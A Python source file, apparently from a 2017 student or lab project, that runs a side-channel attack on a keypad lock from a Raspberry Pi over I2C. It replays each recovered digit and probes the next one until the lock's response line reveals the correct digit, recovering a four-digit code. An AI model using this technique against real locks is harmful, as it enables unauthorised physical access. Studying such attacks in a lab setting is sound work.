#-------------------------------------------------------------------------------
# Name:        Side channel code
# Purpose:  This code runs the side chanel attack. It cycles through all the numbers and waits to see if there is a delay associated with the red led turning on
#           It needs sleeps so the lock code can run
#Functions:
#       checkingnum():
#           The function that runs through all the numbers and stores each correct digit. has to go back to one after each correct digit.
#           needs to
#       pulldown(index):
#           pulls down one of the three columns based on what index checkingnum has passed it. but first it makes sure the pi is activating the right row
#       next_red():
#           This function ets the program know when the red LED is on
# Author:      callum
#
# Created:     25/04/2017
# Copyright:   (c) callum 2017
# Licence:     <your licence>
#-------------------------------------------------------------------------------
import time
import smbus

BUS_ADDRESS = 1
LOCK_PICK_ADDRESS = 0b0111000
INPUT_MASK = 0x8f

DEBUG_LEVEL = 3

DIGITS = ["1","2","3","4","5","6","7","8","9","*","0","#"]
# "digit": (row bit, column bit)
DIGIT_MAP = {"1":(0,0),"2":(0,1),"3":(0,2),
             "4":(1,0),"5":(1,1),"6":(1,2),
             "7":(2,0),"8":(2,1),"9":(2,2),
             "*":(3,0),"0":(3,1),"#":(3,2)}

def debug(level, arg):
    if level<=DEBUG_LEVEL:
        print(str(level) + ") " + str(arg))

def main():
    bus = smbus.SMBus(BUS_ADDRESS)
    print(find_code(bus))
    

def find_code(bus):
    code = []

    for i in range(4):
        found = False
        digit_index = 0
        while not found and digit_index<len(DIGITS):
            #send code so far
            debug(1, 'sending existing code:' + str(code))
            for digit in code:
                send_digit(digit, bus)

            #test next digit
            digit = DIGITS[digit_index]
            debug(1, 'testing digit' + str(digit))
            send_digit(digit, bus)

            resp = get_next_line(bus)

            if resp==7:
                debug(1, 'got it')
                code.append(digit)
                found = True
            else:
                debug(1, 'try agian')
                digit_index += 1
    return code

def write(bus, byte, mask=0xff, current_byte = 0x00):
    byte = (byte & mask) | (current_byte & ~mask)
    bus.write_byte(LOCK_PICK_ADDRESS, byte)
    return byte

def read(bus, mask=0xff):
    byte = bus.read_byte(LOCK_PICK_ADDRESS)
    debug(3, bin(byte))
    return byte & mask

def get_next_line(bus, current_byte = 0x00, active_low=True):
    # Set the lines to read high
    write(bus, INPUT_MASK, INPUT_MASK, current_byte)
    time.sleep(0.001)
    byte_read = 0xff if active_low else 0x00 
    debug(2, 'waiting for line')
    #I'm sorry
    while not bool(byte_read ^ (0xff if active_low else 0x00)):
        byte_read = read(bus, INPUT_MASK)
        time.sleep(0.001)
    debug(2, 'byte ' + bin(byte_read))
    for bit in range(7, -1, -1):
        bit_mask = 1 << bit
        if bool(INPUT_MASK & bit_mask):
            if bool(byte_read & bit_mask) != active_low:
                debug(2, 'found ' + str(bit))
                return bit
    raise ValueError('no valid bit found after read')

def wait_for_line(bus, bit, current_byte = 0x00, active_low=True):
    while get_next_line(bus, current_byte, active_low) != bit:
        time.sleep(0.001)

def send_digit(digit, bus):
    row_bit, column_bit = DIGIT_MAP[digit]
    #wait for line to go low
    debug(2, 'waiting for line: ' + str(row_bit))
    wait_for_line(bus, row_bit)

    #shift by 4 and invert (as active low)
    column_code = ~(column_bit<<4)
    debug(2, 'sending ' + str(column_code))
    write(bus, column_code)

if __name__ == "__main__":
    main()
